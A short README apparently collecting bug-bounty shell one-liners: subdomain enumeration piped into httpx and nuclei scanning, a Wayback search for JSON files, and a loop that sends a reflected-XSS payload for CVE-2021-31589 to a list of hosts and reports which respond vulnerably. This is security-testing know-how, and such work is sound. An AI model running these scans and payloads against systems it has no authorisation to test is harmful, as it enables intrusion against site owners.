# Oneliner-Bugbounty
A collection  oneliner scripts for bug bounty

### Auto scanner

```bash
subfinder -d site.com | httpx | nuclei -t nuclei-templates
```

### Finding files (For example in here .json file)

```bash
subfinder -d site.com | httpx | waybackurls | grep -E ".json(?:onp?)?$"
```

### CVE-2021-31589

```bash
cat subs.txt | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done
```
